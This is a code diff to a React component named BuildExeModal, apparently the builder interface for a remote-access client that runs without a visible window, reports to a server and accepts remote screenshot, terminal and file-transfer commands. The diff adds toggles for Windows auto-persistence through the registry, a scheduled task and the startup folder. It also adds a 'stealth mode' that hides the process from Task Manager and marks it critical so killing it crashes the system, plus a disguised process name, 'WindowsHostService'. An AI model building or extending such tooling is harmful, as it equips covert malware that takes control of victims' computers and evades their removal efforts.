@@ -17,6 +17,9 @@ export default function BuildExeModal({ open, onClose, builder }: BuildExeModalP
   const [serverUrl, setServerUrl] = useState("http://localhost:3000")
   const [heartbeatInterval, setHeartbeatInterval] = useState("30")
   const [country, setCountry] = useState(builder?.country || "")
+  const [persist, setPersist] = useState(true)
+  const [stealth, setStealth] = useState(true)
+  const [installName, setInstallName] = useState("WindowsHostService")
   const [building, setBuilding] = useState(false)
   const [buildResult, setBuildResult] = useState<any>(null)
 
@@ -43,6 +46,9 @@ export default function BuildExeModal({ open, onClose, builder }: BuildExeModalP
           serverUrl,
           heartbeatInterval: parseInt(heartbeatInterval) || 30,
           country: country || undefined,
+          persist,
+          stealth,
+          installName,
         }),
       })
       const data = await res.json()
@@ -185,6 +191,44 @@ export default function BuildExeModal({ open, onClose, builder }: BuildExeModalP
                       <p className="text-xs text-muted-foreground mt-1">Flag shown on the builder card</p>
                     </div>
 
+                    {/* Persistence & Stealth Options */}
+                    <div className="p-4 rounded-xl border border-zinc-700 bg-zinc-900/60 space-y-3">
+                      <p className="text-xs font-semibold uppercase tracking-wider text-zinc-400">Stealth & Persistence</p>
+
+                      <label className="flex items-center justify-between cursor-pointer">
+                        <div>
+                          <span className="text-sm font-medium text-white">Auto-Persistence</span>
+                          <p className="text-[10px] text-zinc-500">Auto-run on Windows startup (Registry + Task + Startup folder)</p>
+                        </div>
+                        <div className={`w-10 h-5 rounded-full transition-colors ${persist ? "bg-green-500" : "bg-zinc-700"}`} onClick={() => setPersist(!persist)}>
+                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${persist ? "ml-5" : "ml-0.5"}`} />
+                        </div>
+                      </label>
+
+                      <label className="flex items-center justify-between cursor-pointer">
+                        <div>
+                          <span className="text-sm font-medium text-white">Stealth Mode</span>
+                          <p className="text-[10px] text-zinc-500">Hide from Task Manager + Critical process (BSOD if killed)</p>
+                        </div>
+                        <div className={`w-10 h-5 rounded-full transition-colors ${stealth ? "bg-green-500" : "bg-zinc-700"}`} onClick={() => setStealth(!stealth)}>
+                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${stealth ? "ml-5" : "ml-0.5"}`} />
+                        </div>
+                      </label>
+
+                      {stealth && (
+                        <div>
+                          <label className="text-xs font-medium text-zinc-400 mb-1 block">Process Name in Task Manager</label>
+                          <input
+                            type="text"
+                            value={installName}
+                            onChange={(e) => setInstallName(e.target.value.replace(/[^a-zA-Z0-9_-]/g, ""))}
+                            className="input-premium w-full text-xs font-mono"
+                          />
+                          <p className="text-[10px] text-zinc-500 mt-0.5">Appears as this in Task Manager details</p>
+                        </div>
+                      )}
+                    </div>
+
                     <div className="p-4 rounded-xl bg-muted/30 space-y-2">
                       <h4 className="text-sm font-semibold">Embedded Configuration</h4>
                       <div className="text-xs text-muted-foreground space-y-1 font-mono">
@@ -196,9 +240,9 @@ export default function BuildExeModal({ open, onClose, builder }: BuildExeModalP
 
                     <div className="p-3 rounded-xl bg-primary/5 border border-primary/10">
                       <p className="text-xs text-muted-foreground">
-                        The client will run as a background process with no visible window.
-                        It connects to the server, reports system info every {heartbeatInterval || 30}s,
-                        and executes remote commands (screenshot, terminal, file transfer).
+                        No visible window · Heartbeat every {heartbeatInterval || 30}s · Remote commands (screenshot, terminal, files).
+                        {persist && " · Auto-starts with Windows (persistence)."}
+                        {stealth && " · Hidden from Task Manager + Critical Process."}
                       </p>
                     </div>
 
